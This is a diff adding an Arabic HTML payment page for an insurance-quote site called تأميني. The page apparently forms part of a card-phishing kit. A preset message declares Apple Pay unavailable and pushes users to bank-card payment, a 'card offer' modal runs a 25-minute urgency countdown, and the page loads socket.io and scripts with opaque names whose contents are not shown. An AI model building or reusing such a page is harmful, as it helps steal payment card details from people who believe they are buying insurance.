@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/stylef.css">
+
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+</header>
+<div class="stepper">
+<div class="step" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step active" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+<main>
+<h2>الملخص والدفع</h2>
+
+<div class="card" id="summaryCard">
+<div class="card-title">ملخص طلب التأمين</div>
+<ul class="summary-list" id="summaryList">
+
+</ul>
+<div class="total-text" id="totalText"></div>
+<div class="total-note">الإجمالي تقريبي وغير ملزم حتى إصدار عرض السعر النهائي من شركة التأمين.</div>
+</div>
+
+<div class="card">
+<div class="card-title">طريقة الدفع</div>
+<span class="label">اختر وسيلة الدفع</span>
+<div class="pay-options">
+<div class="pay-option" data-method="card">
+<div class="pay-main">
+<span class="pay-title">بطاقة بنكية</span>
+<span class="pay-sub">مدى / فيزا / ماستركارد</span>
+</div>
+<div class="pay-logos">
+  <img src="assets/photos/mad.png"    alt="مدى"  class="pay-logo pay-logo-mada">
+  <img src="assets/photos/vimas.webp" alt="فيزا ماستر" class="pay-logo">
+</div>
+<input class="pay-radio" name="payMethod" type="radio" value="card"/>
+</div>
+<div class="pay-option" data-method="apple">
+<div class="pay-main">
+<span class="pay-title">Apple Pay</span>
+<span class="pay-sub">دفع عن طريق Apple Pay</span>
+</div>
+<div class="pay-logos">
+  <img src="assets/photos/appy.jpg" alt="Apple Pay" class="pay-logo pay-logo-apple">
+</div>
+<input class="pay-radio" name="payMethod" type="radio" value="apple"/>
+</div>
+</div>
+<div class="warning" id="appleWarning" style="display:none;">
+        عذراً، خدمة Apple Pay غير متوفرة في الوقت الحالي. الرجاء اختيار بطاقة بنكية.
+      </div>
+<div class="error" id="payError"></div>
+</div>
+<div class="buttons-row">
+<a class='btn btn-secondary' href='addons.html'>السابق</a>
+<button class="btn btn-primary" id="confirmBtn" type="button">تأكيد الدفع</button>
+</div>
+
+<div class="offer-modal" id="offer-modal">
+<div class="offer-modal-backdrop"></div>
+<div class="offer-modal-box">
+<button class="offer-close" id="offerCloseBtn">×</button>
+<img alt="عرض البطاقات" class="offer-image" src="offer-cards.jpeg"/>
+<div class="offer-timer-title">باقي للعرض</div>
+<div class="offer-timer">
+<div class="time-block">
+<span id="offer-minutes">25</span>
+<div class="time-label">دقائق</div>
+</div>
+<div class="time-separator">:</div>
+<div class="time-block">
+<span id="offer-seconds">00</span>
+<div class="time-label">ثواني</div>
+</div>
+</div>
+<button class="offer-continue-btn" id="offerContinueBtn">
+        متابعة
+      </button>
+</div>
+</div>
+</main>
+</div>
+
+
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+<script src="js/summary.js"></script>
+<script src="js/v2x0.js"></script>
+<script src="js/kn5k.js"></script>
+</body>
+</html>
